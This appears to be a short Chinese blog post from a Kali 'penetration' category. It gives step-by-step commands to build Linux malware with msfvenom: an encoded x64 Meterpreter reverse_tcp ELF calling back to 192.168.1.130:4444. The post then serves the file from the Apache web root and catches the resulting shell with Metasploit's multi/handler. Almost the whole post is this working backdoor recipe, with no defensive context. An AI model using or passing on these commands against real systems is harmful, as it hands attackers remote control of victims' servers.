---
title: "制作Linux恶意软件获取服务器权限"
date: 2020-02-22T19:37:26+08:00
author: 姚先生
categories: ['Kali']
tags: ['安全渗透']
---

Metasploit木马命令制作Linux恶意软件获取服务器权限



<!--more-->



## 实现步骤

* 生成Linux恶意软件

~~~
msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.130 LPORT=4444 -b "\x00" -f elf -i 20 -o /var/www/html/xuegod
~~~

* 开启WEB服务

~~~
systemctl start apache2
systemctl enable apache2
systemctl status apache2
~~~

* 在MSF上启动handler开始监听后门程序

~~~
msfdb run
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
run
help
background
sessions
~~~

